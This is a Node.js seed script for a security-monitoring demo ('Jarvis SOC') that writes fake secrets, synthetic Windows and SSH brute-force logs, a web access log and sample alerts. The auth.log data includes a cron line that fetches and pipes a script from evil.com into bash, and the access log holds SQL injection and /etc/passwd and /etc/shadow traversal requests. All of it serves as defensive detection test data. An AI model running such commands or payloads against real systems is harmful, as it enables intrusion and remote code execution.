// ============================================================
// Jarvis SOC — Seed Demo Data
// Creates test files for demonstration and testing.
// Run: node scripts/seed-demo-data.js
// ============================================================

const fs = require('fs');
const path = require('path');

const DATA_DIR = path.join(__dirname, '..', 'data');
const DEMO_LOGS_DIR = path.join(DATA_DIR, 'demo-logs');
const PROJECT_ROOT = path.join(__dirname, '..');

function ensureDir(dir) {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
}

// ---- 1. Test secrets file ----
function seedSecrets() {
  const secretsFile = path.join(DEMO_LOGS_DIR, 'test_secrets.txt');
  const content = `# Test file for secrets scanning demo
# These are FAKE keys for demonstration only — none of these are functional

AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

STRIPE_SECRET_KEY=sk_test_fake_sample_key_for_testing_purposes_only

GITHUB_TOKEN=ghp_fake_mock_token_for_demo_scanning_purposes_only

# Database connection with embedded password
DATABASE_URL=postgres://admin:Sup3rS3cret@localhost:5432/production_db

# JWT token (expired, for demo)
AUTH_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U

# Slack webhook
SLACK_WEBHOOK=xoxb-mock-sample-token-for-demo-purposes-only
`;
  fs.writeFileSync(secretsFile, content);
  // Also copy to project root for easy "scan test_secrets.txt" commands
  fs.writeFileSync(path.join(PROJECT_ROOT, 'test_secrets.txt'), content);
  console.log('[Seed] Created data/demo-logs/test_secrets.txt');
}


// ---- 2. Windows event log (text format with Event IDs) ----
function seedWindowsEventLog() {
  const logFile = path.join(DEMO_LOGS_DIR, 'windows_events.txt');
  const events = [
    'TimeCreated: 2024-01-15T08:23:01Z | EventID: 4625 | Source: Security | Failed logon attempt for user admin from 192.168.1.100',
    'TimeCreated: 2024-01-15T08:23:05Z | EventID: 4625 | Source: Security | Failed logon attempt for user admin from 192.168.1.100',
    'TimeCreated: 2024-01-15T08:23:08Z | EventID: 4625 | Source: Security | Failed logon attempt for user admin from 192.168.1.100',
    'TimeCreated: 2024-01-15T08:23:12Z | EventID: 4625 | Source: Security | Failed logon attempt for user admin from 192.168.1.100',
    'TimeCreated: 2024-01-15T08:23:15Z | EventID: 4625 | Source: Security | Failed logon attempt for user administrator from 192.168.1.100',
    'TimeCreated: 2024-01-15T08:25:00Z | EventID: 4720 | Source: Security | New user account created: backdoor_admin by SYSTEM',
    'TimeCreated: 2024-01-15T08:25:30Z | EventID: 4732 | Source: Security | User backdoor_admin added to Administrators group',
    'TimeCreated: 2024-01-15T08:27:00Z | EventID: 7045 | Source: System  | New service installed: SuspiciousService.exe by backdoor_admin',
    'TimeCreated: 2024-01-15T08:28:00Z | EventID: 4698 | Source: Security | Scheduled task created: \\\\Persistence\\\\UpdateCheck',
    'TimeCreated: 2024-01-15T08:30:00Z | EventID: 1102 | Source: Security | Audit log was cleared by SYSTEM',
    'TimeCreated: 2024-01-15T08:31:00Z | EventID: 4624 | Source: Security | Successful logon for backdoor_admin from 192.168.1.100',
  ];

  fs.writeFileSync(logFile, events.join('\n') + '\n');
  console.log('[Seed] Created data/demo-logs/windows_events.txt (11 events — IDs 4625, 4720, 4732, 7045, 4698, 1102)');
}

// ---- 3. Linux auth.log (SSH brute force) ----
function seedAuthLog() {
  const logFile = path.join(DEMO_LOGS_DIR, 'auth.log');
  const lines = [
    'Jan 15 08:20:01 webserver sshd[12340]: Failed password for root from 192.168.1.100 port 54321 ssh2',
    'Jan 15 08:20:03 webserver sshd[12341]: Failed password for root from 192.168.1.100 port 54322 ssh2',
    'Jan 15 08:20:05 webserver sshd[12342]: Failed password for root from 192.168.1.100 port 54323 ssh2',
    'Jan 15 08:20:07 webserver sshd[12343]: Failed password for root from 192.168.1.100 port 54324 ssh2',
    'Jan 15 08:20:09 webserver sshd[12344]: Failed password for root from 192.168.1.100 port 54325 ssh2',
    'Jan 15 08:20:11 webserver sshd[12345]: Failed password for root from 192.168.1.100 port 54326 ssh2',
    'Jan 15 08:20:13 webserver sshd[12346]: Failed password for root from 192.168.1.100 port 54327 ssh2',
    'Jan 15 08:20:15 webserver sshd[12347]: Failed password for admin from 192.168.1.100 port 54328 ssh2',
    'Jan 15 08:20:17 webserver sshd[12348]: Failed password for admin from 192.168.1.100 port 54329 ssh2',
    'Jan 15 08:20:19 webserver sshd[12349]: Failed password for admin from 192.168.1.100 port 54330 ssh2',
    'Jan 15 08:21:00 webserver sshd[12350]: Accepted password for admin from 192.168.1.100 port 54331 ssh2',
    'Jan 15 08:22:00 webserver sudo: admin : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash',
    'Jan 15 08:23:00 webserver su[12351]: + /dev/pts/0 admin:root',
    'Jan 15 08:25:00 webserver CRON[12352]: (root) CMD (wget http://evil.com/backdoor.sh | bash)',
  ];

  fs.writeFileSync(logFile, lines.join('\n') + '\n');
  console.log('[Seed] Created data/demo-logs/auth.log (SSH brute force from 192.168.1.100 — 10 failed, 1 success, sudo, su, cron)');
}

// ---- 4. Web server access log with attacks ----
function seedAccessLog() {
  const logFile = path.join(DEMO_LOGS_DIR, 'access.log');
  const lines = [
    '192.168.1.50 - - [15/Jan/2024:08:10:01 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0"',
    '192.168.1.50 - - [15/Jan/2024:08:10:02 +0000] "GET /login HTTP/1.1" 200 890 "-" "Mozilla/5.0"',
    '10.0.0.5 - - [15/Jan/2024:08:11:00 +0000] "GET /admin\'%20OR%201=1-- HTTP/1.1" 403 0 "-" "sqlmap/1.7"',
    '10.0.0.5 - - [15/Jan/2024:08:11:01 +0000] "GET /users?id=1%20UNION%20SELECT%20*%20FROM%20passwords HTTP/1.1" 403 0 "-" "sqlmap/1.7"',
    '10.0.0.5 - - [15/Jan/2024:08:11:02 +0000] "GET /search?q=1;DROP%20TABLE%20users HTTP/1.1" 500 0 "-" "sqlmap/1.7"',
    '10.0.0.5 - - [15/Jan/2024:08:11:03 +0000] "POST /login HTTP/1.1" 200 234 "-" "sqlmap/1.7"',
    '10.0.0.5 - - [15/Jan/2024:08:11:04 +0000] "GET /api/users?id=1%20OR%201=1 HTTP/1.1" 200 5678 "-" "sqlmap/1.7"',
    '172.16.0.99 - - [15/Jan/2024:08:15:00 +0000] "GET /../../etc/passwd HTTP/1.1" 400 0 "-" "Nikto/2.1.6"',
    '172.16.0.99 - - [15/Jan/2024:08:15:01 +0000] "GET /..%2f..%2fetc/shadow HTTP/1.1" 400 0 "-" "Nikto/2.1.6"',
    '172.16.0.99 - - [15/Jan/2024:08:15:02 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 404 0 "-" "Nikto/2.1.6"',
    '172.16.0.99 - - [15/Jan/2024:08:15:03 +0000] "GET /wp-admin/ HTTP/1.1" 404 0 "-" "Nikto/2.1.6"',
    '172.16.0.99 - - [15/Jan/2024:08:15:04 +0000] "GET /phpmyadmin/ HTTP/1.1" 404 0 "-" "Nikto/2.1.6"',
    '192.168.1.50 - - [15/Jan/2024:08:20:00 +0000] "GET /dashboard HTTP/1.1" 200 2345 "-" "Mozilla/5.0"',
  ];

  fs.writeFileSync(logFile, lines.join('\n') + '\n');
  console.log('[Seed] Created data/demo-logs/access.log (13 requests — 5 SQLi from sqlmap, 5 scanner from Nikto)');
}

// ---- 5. Pre-seeded alerts ----
function seedAlerts() {
  const alertsFile = path.join(DATA_DIR, 'alerts.json');
  const now = new Date();
  const alerts = [
    {
      id: 'INC-' + now.toISOString().slice(0, 10) + '-001',
      title: 'Suspicious outbound connection to known C2 IP 185.220.101.42',
      severity: 'CRITICAL',
      source: 'Network Monitor',
      details: 'Detected persistent outbound connection on port 443 to known Tor exit node 185.220.101.42. Connection established 14 minutes ago.',
      status: 'OPEN',
      triageDecision: null,
      triageNotes: null,
      priority: 'P1',
      createdAt: new Date(now - 840000).toISOString(),
      updatedAt: new Date(now - 840000).toISOString(),
      closedAt: null,
      resolution: null,
      mitreMapping: [{ id: 'T1071', name: 'Application Layer Protocol' }],
      timelineEvents: [
        { time: new Date(now - 840000).toISOString(), event: 'Alert created', actor: 'Jarvis' },
      ],
    },
    {
      id: 'INC-' + now.toISOString().slice(0, 10) + '-002',
      title: 'Multiple failed SSH logins from 45.154.255.11 (23 attempts)',
      severity: 'HIGH',
      source: 'Linux Syslog',
      details: '23 failed SSH login attempts from 45.154.255.11 in the last 5 minutes. Source IP matches known credential-stuffing infrastructure.',
      status: 'OPEN',
      triageDecision: null,
      triageNotes: null,
      priority: 'P2',
      createdAt: new Date(now - 300000).toISOString(),
      updatedAt: new Date(now - 300000).toISOString(),
      closedAt: null,
      resolution: null,
      mitreMapping: [{ id: 'T1110', name: 'Brute Force' }],
      timelineEvents: [
        { time: new Date(now - 300000).toISOString(), event: 'Alert created', actor: 'Jarvis' },
      ],
    },
  ];

  fs.writeFileSync(alertsFile, JSON.stringify(alerts, null, 2));
  console.log('[Seed] Created data/alerts.json (2 pre-seeded alerts: 1 CRITICAL, 1 HIGH)');
}

// ---- Run All ----
console.log('\n  ╔═══════════════════════════════════════╗');
console.log('  ║  JARVIS SOC — Seeding Demo Data       ║');
console.log('  ╚═══════════════════════════════════════╝\n');

ensureDir(DATA_DIR);
ensureDir(DEMO_LOGS_DIR);
seedSecrets();
seedWindowsEventLog();
seedAuthLog();
seedAccessLog();
seedAlerts();

console.log('\n[Seed] All demo data created. Files:');
console.log('  data/demo-logs/test_secrets.txt');
console.log('  data/demo-logs/windows_events.txt');
console.log('  data/demo-logs/auth.log');
console.log('  data/demo-logs/access.log');
console.log('  data/alerts.json');
console.log('  test_secrets.txt (project root copy)\n');
